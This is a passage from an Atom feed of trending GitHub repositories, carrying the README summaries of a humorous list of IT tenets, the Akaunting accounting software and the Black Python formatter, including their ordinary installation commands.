    <id>tag:github.com,2022-06-03:/DavidBrightSparc/Tenets-of-IT</id>
    <link href="https://github.com/DavidBrightSparc/Tenets-of-IT" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The Tenets of IT: an accumulation of IT advice, wisdom, and humour.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Tenets of IT&lt;/h1&gt; &#xA;&lt;p&gt;&lt;em&gt;It is a good reminder to not overthink some problems. These tenets have been created over decades as a way of reminding ourselves of the things sometimes overlooked.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Reboot, reinstall, replace.&lt;/li&gt; &#xA; &lt;li&gt;Rebooting is a band aid. Figure out why you had to.&lt;/li&gt; &#xA; &lt;li&gt;It&#39;s always DNS.&lt;/li&gt; &#xA; &lt;li&gt;When it’s not DNS, it’s MTU.&lt;/li&gt; &#xA; &lt;li&gt;When it’s not MTU, it’s BGP.&lt;/li&gt; &#xA; &lt;li&gt;When it’s not BGP, it’s LACP.&lt;/li&gt; &#xA; &lt;li&gt;Under-promise, over-deliver.&lt;/li&gt; &#xA; &lt;li&gt;Plan for the worst, hope for the best.&lt;/li&gt; &#xA; &lt;li&gt;Always implement two-factor-authentication, no matter how loudly the users complain.&lt;/li&gt; &#xA; &lt;li&gt;Have the user show you the problem, often it is the user doing something in an unusual way.&lt;/li&gt; &#xA; &lt;li&gt;Fast. Cheap. Good. You may pick one, two if you&#39;re lucky.&lt;/li&gt; &#xA; &lt;li&gt;Never stop learning.&lt;/li&gt; &#xA; &lt;li&gt;The Six Ps: Proper Planning Prevents Piss Poor Performance.&lt;/li&gt; &#xA; &lt;li&gt;It&#39;s always an emergency, until it incurs an extra charge.&lt;/li&gt; &#xA; &lt;li&gt;Everyone has a test environment, not everyone is lucky enough to have a separate production environment.&lt;/li&gt; &#xA; &lt;li&gt;If anyone can&#39;t find the documentation it&#39;s not documented, if it&#39;s not documented it doesn&#39;t exist.&lt;/li&gt; &#xA; &lt;li&gt;If you think it&#39;s going to be a disaster, get it in writing and CYA.&lt;/li&gt; &#xA; &lt;li&gt;Poor planning on a users part, does not constitute an emergency on yours.&lt;/li&gt; &#xA; &lt;li&gt;Fridays are read-only. (aka - no changes on a Friday)&lt;/li&gt; &#xA; &lt;li&gt;A backup isn&#39;t a backup until you&#39;ve restored successfully from it.&lt;/li&gt; &#xA; &lt;li&gt;Snapshots are not backups.&lt;/li&gt; &#xA; &lt;li&gt;If a backup isn&#39;t off-site, it isn&#39;t a backup.&lt;/li&gt; &#xA; &lt;li&gt;If it isn&#39;t in a ticket, it&#39;s not getting done.&lt;/li&gt; &#xA; &lt;li&gt;Treat all users the same, regardless of their last name.&lt;/li&gt; &#xA; &lt;li&gt;It&#39;s never a &#34;5 minute thing&#34;.&lt;/li&gt; &#xA; &lt;li&gt;Security and ease of use.. rarely walk hand in hand.&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;&#34;Not my circus, not my monkeys.&#34;&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;Everybody lies.&lt;/li&gt; &#xA; &lt;li&gt;Never ask a user a question that you can easily confirm yourself.&lt;/li&gt; &#xA; &lt;li&gt;The fastest path to resolution first requires removing the user from the problem. (aka isolate layer 8)&lt;/li&gt; &#xA; &lt;li&gt;You are replaceable at work, no matter how highly you think of yourself. You are not replaceable at home.&lt;/li&gt; &#xA; &lt;li&gt;Never give a web developer/designer access to the DNS.&lt;/li&gt; &#xA; &lt;li&gt;Own up to your mistakes. That way, when it isn’t your fault, people will believe you.&lt;/li&gt; &#xA; &lt;li&gt;If you have to do something twice, automate it.&lt;/li&gt; &#xA; &lt;li&gt;Never spend 6 minutes doing something manually, that you spend 6 hours failing to automate.&lt;/li&gt; &#xA; &lt;li&gt;To make an error is human. To propagate an error to all servers in an automatic way is devops.&lt;/li&gt; &#xA; &lt;li&gt;Skilled IT professionals will continuously be given more work, until they can do none of it skillfully.&lt;/li&gt; &#xA; &lt;li&gt;Give me a new hire that is a blank slate and willing to learn, over a seasoned tech that hates this job and doesn&#39;t want to learn or change.&lt;/li&gt; &#xA; &lt;li&gt;IT time is relative.&lt;/li&gt; &#xA; &lt;li&gt;Yes it&#39;s free/cheap. No, it&#39;s not going in the server room.&lt;/li&gt; &#xA; &lt;li&gt;You provide the problem and business case, let IT provide the solution.&lt;/li&gt; &#xA; &lt;li&gt;IT&#39;s job is to solve people problems with technology.&lt;/li&gt; &#xA; &lt;li&gt;Technology can&#39;t solve people problems.&lt;/li&gt; &#xA; &lt;li&gt;Nothing is more permanent than a temporary expedient.&lt;/li&gt; &#xA; &lt;li&gt;Fix the problem now, it&#39;s just going to happen again when it&#39;s less convenient.&lt;/li&gt; &#xA; &lt;li&gt;If the network guys say it&#39;s not the network, there is an 80% chance it&#39;s the network.&lt;/li&gt; &#xA; &lt;li&gt;Traceroute is your friend.&lt;/li&gt; &#xA; &lt;li&gt;80% of the time CAPEX becomes OPEX when you can get 0% financing. Accounting HATES CAPEX.&lt;/li&gt; &#xA; &lt;li&gt;If it doesn&#39;t log automatically make it log! Log&#39;s just spit out the answer for you!&lt;/li&gt; &#xA; &lt;li&gt;There are some jobs and clients you must walk away from.&lt;/li&gt; &#xA; &lt;li&gt;If you can smell the magic smoke, you’re already screwed.&lt;/li&gt; &#xA; &lt;li&gt;&#34;Working just fine&#34; and &#34;too screwed to log an error&#34; look an awful lot alike.&lt;/li&gt; &#xA; &lt;li&gt;The longer everything goes according to plan, the bigger the impending disaster.&lt;/li&gt; &#xA; &lt;li&gt;Sales Engineers are a gift from heaven, they prevent salespeople from over-promising.&lt;/li&gt; &#xA; &lt;li&gt;Printers have moods, most of the time that mood is &#39;Fuck you&#39;.&lt;/li&gt; &#xA;&lt;/ol&gt;</summary>
  </entry>
  <entry>
    <title>akaunting/akaunting</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/akaunting/akaunting</id>
    <link href="https://github.com/akaunting/akaunting" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Free and Online Accounting Software&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Akaunting™&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/akaunting/akaunting/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/release/akaunting/akaunting?label=release&#34; alt=&#34;Release&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/downloads/akaunting/akaunting/total?label=downloads&#34; alt=&#34;Downloads&#34;&gt; &lt;a href=&#34;https://crowdin.com/project/akaunting&#34;&gt;&lt;img src=&#34;https://badges.crowdin.net/akaunting/localized.svg?sanitize=true&#34; alt=&#34;Translations&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/akaunting/akaunting/actions&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/workflow/status/akaunting/akaunting/Tests?label=tests&#34; alt=&#34;Tests&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/akaunting/akaunting/master/LICENSE.txt&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/akaunting/akaunting?label=license&#34; alt=&#34;License&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Akaunting is a free, open source and online accounting software designed for small businesses and freelancers. It is built with modern technologies such as Laravel, VueJS, Tailwind, RESTful API etc. Thanks to its modular structure, Akaunting provides an awesome App Store for users and developers.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://akaunting.com&#34;&gt;Home&lt;/a&gt; - The house of Akaunting&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://akaunting.com/forum&#34;&gt;Forum&lt;/a&gt; - Ask for support&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://akaunting.com/docs&#34;&gt;Documentation&lt;/a&gt; - Learn how to use&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://developer.akaunting.com&#34;&gt;Developer Portal&lt;/a&gt; - Generate passive income&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://akaunting.com/apps&#34;&gt;App Store&lt;/a&gt; - Extend your Akaunting&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://crowdin.com/project/akaunting&#34;&gt;Translations&lt;/a&gt; - Help us translate Akaunting&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PHP 8.0 or higher&lt;/li&gt; &#xA; &lt;li&gt;Database (eg: MySQL, PostgreSQL, SQLite)&lt;/li&gt; &#xA; &lt;li&gt;Web Server (eg: Apache, Nginx, IIS)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://akaunting.com/docs/requirements&#34;&gt;Other libraries&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Framework&lt;/h2&gt; &#xA;&lt;p&gt;Akaunting uses &lt;a href=&#34;http://laravel.com&#34;&gt;Laravel&lt;/a&gt;, the best existing PHP framework, as the foundation framework and &lt;a href=&#34;https://github.com/akaunting/module&#34;&gt;Module&lt;/a&gt; package for Apps.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install &lt;a href=&#34;https://getcomposer.org/download&#34;&gt;Composer&lt;/a&gt; and &lt;a href=&#34;https://nodejs.org/en/download&#34;&gt;Npm&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Clone the repository: &lt;code&gt;git clone https://github.com/akaunting/akaunting.git&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Install dependencies: &lt;code&gt;composer install ; npm install ; npm run dev&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Install Akaunting:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;php artisan install --db-name=&#34;akaunting&#34; --db-username=&#34;root&#34; --db-password=&#34;pass&#34; --admin-email=&#34;admin@company.com&#34; --admin-password=&#34;123456&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Create sample data (optional): &lt;code&gt;php artisan sample-data:seed&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Please, be very clear on your commit messages and pull requests, empty pull request messages may be rejected without reason.&lt;/p&gt; &#xA;&lt;p&gt;When contributing code to Akaunting, you must follow the PSR coding standards. The golden rule is: Imitate the existing Akaunting code.&lt;/p&gt; &#xA;&lt;p&gt;Please note that this project is released with a &lt;a href=&#34;https://akaunting.com/conduct&#34;&gt;Contributor Code of Conduct&lt;/a&gt;. By participating in this project you agree to abide by its terms.&lt;/p&gt; &#xA;&lt;h2&gt;Translation&lt;/h2&gt; &#xA;&lt;p&gt;If you&#39;d like to contribute translations, please check out our &lt;a href=&#34;https://crowdin.com/project/akaunting&#34;&gt;Crowdin&lt;/a&gt; project.&lt;/p&gt; &#xA;&lt;h2&gt;Changelog&lt;/h2&gt; &#xA;&lt;p&gt;Please see &lt;a href=&#34;https://raw.githubusercontent.com/akaunting/releases&#34;&gt;Releases&lt;/a&gt; for more information what has changed recently.&lt;/p&gt; &#xA;&lt;h2&gt;Security&lt;/h2&gt; &#xA;&lt;p&gt;Please review &lt;a href=&#34;https://github.com/akaunting/akaunting/security/policy&#34;&gt;our security policy&lt;/a&gt; on how to report security vulnerabilities.&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/denisdulici&#34;&gt;Denis Duliçi&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cuneytsenturk&#34;&gt;Cüneyt Şentürk&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/akaunting/contributors&#34;&gt;All Contributors&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Akaunting is released under the &lt;a href=&#34;https://raw.githubusercontent.com/akaunting/akaunting/master/LICENSE.txt&#34;&gt;GPLv3 license&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>psf/black</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/psf/black</id>
    <link href="https://github.com/psf/black" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The uncompromising Python code formatter&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/psf/black/main/docs/_static/logo2-readme.png&#34; alt=&#34;Black Logo&#34;&gt;&lt;/p&gt; &#xA;&lt;h2 align=&#34;center&#34;&gt;The Uncompromising Code Formatter&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/psf/black/actions&#34;&gt;&lt;img alt=&#34;Actions Status&#34; src=&#34;https://github.com/psf/black/workflows/Test/badge.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://black.readthedocs.io/en/stable/?badge=stable&#34;&gt;&lt;img alt=&#34;Documentation Status&#34; src=&#34;https://readthedocs.org/projects/black/badge/?version=stable&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://coveralls.io/github/psf/black?branch=main&#34;&gt;&lt;img alt=&#34;Coverage Status&#34; src=&#34;https://coveralls.io/repos/github/psf/black/badge.svg?branch=main&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/psf/black/raw/main/LICENSE&#34;&gt;&lt;img alt=&#34;License: MIT&#34; src=&#34;https://black.readthedocs.io/en/stable/_static/license.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/black/&#34;&gt;&lt;img alt=&#34;PyPI&#34; src=&#34;https://img.shields.io/pypi/v/black&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pepy.tech/project/black&#34;&gt;&lt;img alt=&#34;Downloads&#34; src=&#34;https://pepy.tech/badge/black&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://anaconda.org/conda-forge/black/&#34;&gt;&lt;img alt=&#34;conda-forge&#34; src=&#34;https://img.shields.io/conda/dn/conda-forge/black.svg?label=conda-forge&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/psf/black&#34;&gt;&lt;img alt=&#34;Code style: black&#34; src=&#34;https://img.shields.io/badge/code%20style-black-000000.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;“Any color you like.”&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;em&gt;Black&lt;/em&gt; is the uncompromising Python code formatter. By using it, you agree to cede control over minutiae of hand-formatting. In return, &lt;em&gt;Black&lt;/em&gt; gives you speed, determinism, and freedom from &lt;code&gt;pycodestyle&lt;/code&gt; nagging about formatting. You will save time and mental energy for more important matters.&lt;/p&gt; &#xA;&lt;p&gt;Blackened code looks the same regardless of the project you&#39;re reading. Formatting becomes transparent after a while and you can focus on the content instead.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Black&lt;/em&gt; makes code review faster by producing the smallest diffs possible.&lt;/p&gt; &#xA;&lt;p&gt;Try it out now using the &lt;a href=&#34;https://black.vercel.app&#34;&gt;Black Playground&lt;/a&gt;. Watch the &lt;a href=&#34;https://youtu.be/esZLCuWs_2Y&#34;&gt;PyCon 2019 talk&lt;/a&gt; to learn more.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://black.readthedocs.io/en/stable&#34;&gt;Read the documentation on ReadTheDocs!&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Installation and usage&lt;/h2&gt; &#xA;&lt;h3&gt;Installation&lt;/h3&gt; &#xA;&lt;p&gt;&lt;em&gt;Black&lt;/em&gt; can be installed by running &lt;code&gt;pip install black&lt;/code&gt;. It requires Python 3.6.2+ to run. If you want to format Jupyter Notebooks, install with &lt;code&gt;pip install &#39;black[jupyter]&#39;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you can&#39;t wait for the latest &lt;em&gt;hotness&lt;/em&gt; and want to install from GitHub, use:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;pip install git+https://github.com/psf/black&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Usage&lt;/h3&gt; &#xA;&lt;p&gt;To get started right away with sensible defaults:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;black {source_file_or_directory}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can run &lt;em&gt;Black&lt;/em&gt; as a package if running it as a script doesn&#39;t work:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python -m black {source_file_or_directory}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Further information can be found in our docs:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://black.readthedocs.io/en/stable/usage_and_configuration/index.html&#34;&gt;Usage and Configuration&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;em&gt;Black&lt;/em&gt; is already &lt;a href=&#34;https://github.com/psf/black#used-by&#34;&gt;successfully used&lt;/a&gt; by many projects, small and big. &lt;em&gt;Black&lt;/em&gt; has a comprehensive test suite, with efficient parallel tests, and our own auto formatting and parallel Continuous Integration runner. Now that we have become stable, you should not expect large formatting to changes in the future. Stylistic changes will mostly be responses to bug reports and support for new Python syntax. For more information please refer to the &lt;a href=&#34;https://black.readthedocs.io/en/stable/the_black_code_style/index.html&#34;&gt;The Black Code Style&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Also, as a safety measure which slows down processing, &lt;em&gt;Black&lt;/em&gt; will check that the reformatted code still produces a valid AST that is effectively equivalent to the original (see the &lt;a href=&#34;https://black.readthedocs.io/en/stable/the_black_code_style/current_style.html#ast-before-and-after-formatting&#34;&gt;Pragmatism&lt;/a&gt; section for details). If you&#39;re feeling confident, use &lt;code&gt;--fast&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;The &lt;em&gt;Black&lt;/em&gt; code style&lt;/h2&gt; &#xA;&lt;p&gt;&lt;em&gt;Black&lt;/em&gt; is a PEP 8 compliant opinionated formatter. &lt;em&gt;Black&lt;/em&gt; reformats entire files in place. Style configuration options are deliberately limited and rarely added. It doesn&#39;t take previous formatting into account (see &lt;a href=&#34;https://black.readthedocs.io/en/stable/the_black_code_style/current_style.html#pragmatism&#34;&gt;Pragmatism&lt;/a&gt; for exceptions).&lt;/p&gt; &#xA;&lt;p&gt;Our documentation covers the current &lt;em&gt;Black&lt;/em&gt; code style, but planned changes to it are also documented. They&#39;re both worth taking a look:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://black.readthedocs.io/en/stable/the_black_code_style/current_style.html&#34;&gt;The &lt;em&gt;Black&lt;/em&gt; Code Style: Current style&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://black.readthedocs.io/en/stable/the_black_code_style/future_style.html&#34;&gt;The &lt;em&gt;Black&lt;/em&gt; Code Style: Future style&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Changes to the &lt;em&gt;Black&lt;/em&gt; code style are bound by the Stability Policy:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://black.readthedocs.io/en/stable/the_black_code_style/index.html#stability-policy&#34;&gt;The &lt;em&gt;Black&lt;/em&gt; Code Style: Stability Policy&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please refer to this document before submitting an issue. What seems like a bug might be intended behaviour.&lt;/p&gt; &#xA;&lt;h3&gt;Pragmatism&lt;/h3&gt; &#xA;&lt;p&gt;Early versions of &lt;em&gt;Black&lt;/em&gt; used to be absolutist in some respects. They took after its initial author. This was fine at the time as it made the implementation simpler and there were not many users anyway. Not many edge cases were reported. As a mature tool, &lt;em&gt;Black&lt;/em&gt; does make some exceptions to rules it otherwise holds.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://black.readthedocs.io/en/stable/the_black_code_style/current_style.html#pragmatism&#34;&gt;The &lt;em&gt;Black&lt;/em&gt; code style: Pragmatism&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please refer to this document before submitting an issue just like with the document above. What seems like a bug might be intended behaviour.&lt;/p&gt; &#xA;&lt;h2&gt;Configuration&lt;/h2&gt; &#xA;&lt;p&gt;&lt;em&gt;Black&lt;/em&gt; is able to read project-specific default values for its command line options from a &lt;code&gt;pyproject.toml&lt;/code&gt; file. This is especially useful for specifying custom &lt;code&gt;--include&lt;/code&gt; and &lt;code&gt;--exclude&lt;/code&gt;/&lt;code&gt;--force-exclude&lt;/code&gt;/&lt;code&gt;--extend-exclude&lt;/code&gt; patterns for your project.&lt;/p&gt; &#xA;&lt;p&gt;You can find more details in our documentation:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://black.readthedocs.io/en/stable/usage_and_configuration/the_basics.html#configuration-via-a-file&#34;&gt;The basics: Configuration via a file&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;And if you&#39;re looking for more general configuration documentation:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://black.readthedocs.io/en/stable/usage_and_configuration/index.html&#34;&gt;Usage and Configuration&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Pro-tip&lt;/strong&gt;: If you&#39;re asking yourself &#34;Do I need to configure anything?&#34; the answer is &#34;No&#34;. &lt;em&gt;Black&lt;/em&gt; is all about sensible defaults. Applying those defaults will have your code in compliance with many other &lt;em&gt;Black&lt;/em&gt; formatted projects.&lt;/p&gt; &#xA;&lt;h2&gt;Used by&lt;/h2&gt; &#xA;&lt;p&gt;The following notable open-source projects trust &lt;em&gt;Black&lt;/em&gt; with enforcing a consistent code style: pytest, tox, Pyramid, Django, Django Channels, Hypothesis, attrs, SQLAlchemy, Poetry, PyPA applications (Warehouse, Bandersnatch, Pipenv, virtualenv), pandas, Pillow, Twisted, LocalStack, every Datadog Agent Integration, Home Assistant, Zulip, Kedro, OpenOA, FLORIS, ORBIT, WOMBAT, and many more.&lt;/p&gt; &#xA;&lt;p&gt;The following organizations use &lt;em&gt;Black&lt;/em&gt;: Facebook, Dropbox, KeepTruckin, Mozilla, Quora, Duolingo, QuantumBlack, Tesla.&lt;/p&gt; &#xA;&lt;p&gt;Are we missing anyone? Let us know.&lt;/p&gt; &#xA;&lt;h2&gt;Testimonials&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Mike Bayer&lt;/strong&gt;, &lt;a href=&#34;https://www.sqlalchemy.org/&#34;&gt;author of &lt;code&gt;SQLAlchemy&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;I can&#39;t think of any single tool in my entire programming career that has given me a bigger productivity increase by its introduction. I can now do refactorings in about 1% of the keystrokes that it would have taken me previously when we had no way for code to format itself.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Dusty Phillips&lt;/strong&gt;, &lt;a href=&#34;https://smile.amazon.com/s/ref=nb_sb_noss?url=search-alias%3Daps&amp;amp;field-keywords=dusty+phillips&#34;&gt;writer&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;em&gt;Black&lt;/em&gt; is opinionated so you don&#39;t have to be.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Hynek Schlawack&lt;/strong&gt;, &lt;a href=&#34;https://www.attrs.org/&#34;&gt;creator of &lt;code&gt;attrs&lt;/code&gt;&lt;/a&gt;, core developer of Twisted and CPython:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;An auto-formatter that doesn&#39;t suck is all I want for Xmas!&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Carl Meyer&lt;/strong&gt;, &lt;a href=&#34;https://www.djangoproject.com/&#34;&gt;Django&lt;/a&gt; core developer:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;At least the name is good.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Kenneth Reitz&lt;/strong&gt;, creator of &lt;a href=&#34;http://python-requests.org/&#34;&gt;&lt;code&gt;requests&lt;/code&gt;&lt;/a&gt; and &lt;a href=&#34;https://readthedocs.org/projects/pipenv/&#34;&gt;&lt;code&gt;pipenv&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;This vastly improves the formatting of our code. Thanks a ton!&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Show your style&lt;/h2&gt; &#xA;&lt;p&gt;Use the badge in your project&#39;s README.md:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-md&#34;&gt;[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using the badge in README.rst:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;.. image:: https://img.shields.io/badge/code%20style-black-000000.svg&#xA;    :target: https://github.com/psf/black&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Looks like this: &lt;a href=&#34;https://github.com/psf/black&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/code%20style-black-000000.svg?sanitize=true&#34; alt=&#34;Code style: black&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;MIT&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Welcome! Happy to see you willing to make the project better. You can get started by reading this:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://black.readthedocs.io/en/latest/contributing/the_basics.html&#34;&gt;Contributing: The basics&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;You can also take a look at the rest of the contributing docs or talk with the developers:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://black.readthedocs.io/en/latest/contributing/index.html&#34;&gt;Contributing documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://discord.gg/RtVdv86PrH&#34;&gt;Chat on Discord&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Change log&lt;/h2&gt; &#xA;&lt;p&gt;The log has become rather long. It moved to its own file.&lt;/p&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://black.readthedocs.io/en/latest/change_log.html&#34;&gt;CHANGES&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Authors&lt;/h2&gt; &#xA;&lt;p&gt;The author list is quite long nowadays, so it lives in its own file.&lt;/p&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/psf/black/main/AUTHORS.md&#34;&gt;AUTHORS.md&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Code of Conduct&lt;/h2&gt; &#xA;&lt;p&gt;Everyone participating in the &lt;em&gt;Black&lt;/em&gt; project, and in particular in the issue tracker, pull requests, and social media activity, is expected to treat other people with respect and more generally to follow the guidelines articulated in the &lt;a href=&#34;https://www.python.org/psf/codeofconduct/&#34;&gt;Python Community Code of Conduct&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;At the same time, humor is encouraged. In fact, basic familiarity with Monty Python&#39;s Flying Circus is expected. We are not savages.&lt;/p&gt; &#xA;&lt;p&gt;And if you &lt;em&gt;really&lt;/em&gt; need to slap somebody, do it with a fish while dancing.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>android/nowinandroid</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/android/nowinandroid</id>
    <link href="https://github.com/android/nowinandroid" rel="alternate"></link>
